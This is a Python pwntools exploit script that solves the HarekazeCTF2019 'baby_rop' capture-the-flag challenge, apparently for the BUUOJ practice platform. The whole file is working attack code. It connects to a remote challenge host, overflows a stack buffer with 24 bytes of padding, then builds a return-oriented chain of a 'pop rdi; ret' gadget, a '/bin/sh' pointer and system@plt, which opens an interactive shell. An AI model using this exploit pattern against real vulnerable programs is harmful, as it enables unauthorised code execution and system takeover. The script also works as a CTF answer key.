from pwn import *


def harekaze_ctf_2019_baby_rop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/[HarekazeCTF2019]baby_rop'):
    print('[HarekazeCTF2019]baby_rop start')
    target = remote('node4.buuoj.cn', 27522)
    target_elf = ELF(file_name)

    system_plt = p64(target_elf.plt['system'])
    bin_sh_ptr = p64(next(target_elf.search(b'/bin/sh')))

    pop_ret_gadget = p64(0x400683)  # pop rdi ; ret

    payload = b'A' * 24
    # system('/bin/sh')
    payload += pop_ret_gadget + bin_sh_ptr + system_plt

    target.sendline(payload)

    target.interactive()
    print('[HarekazeCTF2019]baby_rop end')


if __name__ == '__main__':
    harekaze_ctf_2019_baby_rop()
